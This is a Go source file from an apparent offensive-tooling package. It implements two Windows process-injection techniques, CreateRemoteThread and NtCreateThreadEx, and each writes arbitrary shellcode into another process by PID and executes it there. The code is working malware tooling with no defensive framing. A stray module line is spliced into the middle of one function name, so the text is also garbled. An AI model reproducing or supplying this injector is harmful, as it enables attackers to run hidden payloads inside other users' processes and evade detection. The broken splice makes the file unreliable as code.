package injection

import (
	"fmt"
	"unsafe"
)

// CreateRemoteThreadInjector implements the classic CreateRemoteThread injection technique
type CreateRemoteThreadInjector struct {
	BaseInjector
}

// NewCreateRemoteThreadInjector creates a new CreateRemoteThread injector
func NewCreateRemoteThreadInjector() *CreateRemoteThreadInjector {
	return &CreateRemoteThreadInjector{
		BaseInjector: BaseInjector{
			name:        "CreateRemoteThread",
			description: "Classic process injection using CreateRemoteThread API",
		},
	}
}

// Inject injects shellcode into a target process using CreateRemoteThread
func (i *CreateRemoteThreadInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Allocate memory in the target process
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		// Free the allocated memory if writing fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		// Free the allocated memory if protection change fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Create a remote thread to execute the shellcode
	hThread, err := CreateRemoteThread(hProcess, 0, 0, addr, 0, 0)
	if err != nil {
		// Free the allocated memory if thread creation fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	// Wait for the thread to complete
	WaitForSingleObject(hThread, INFINITE)

	// Get the thread exit code
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

// NtCreateThreadExInjector implements the NtCreateThreadEx injection technique
type NtCreateThreadExInjector struct {
	BaseInjector
}

// NewNtCreateThreadExInjector creates a new NtCreateThreadEx injector
func NewNtCreateTh	module "project/src/core/module"
readExInjector() *NtCreateThreadExInjector {
	return &NtCreateThreadExInjector{
		BaseInjector: BaseInjector{
			name:        "NtCreateThreadEx",
			description: "Process injection using the undocumented NtCreateThreadEx API",
		},
	}
}

// Inject injects shellcode into a target process using NtCreateThreadEx
func (i *NtCreateThreadExInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Allocate memory in the target process
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		// Free the allocated memory if writing fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		// Free the allocated memory if protection change fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Create a remote thread using NtCreateThreadEx
	var hThread HANDLE
	status, _, _ := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(hProcess),
		uintptr(addr),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

	if status != 0 {
		// Free the allocated memory if thread creation fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx failed with status: 0x%x", status)
	}
	defer CloseHandle(hThread)

	// Wait for the thread to complete
	WaitForSingleObject(hThread, INFINITE)

	// Get the thread exit code
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}
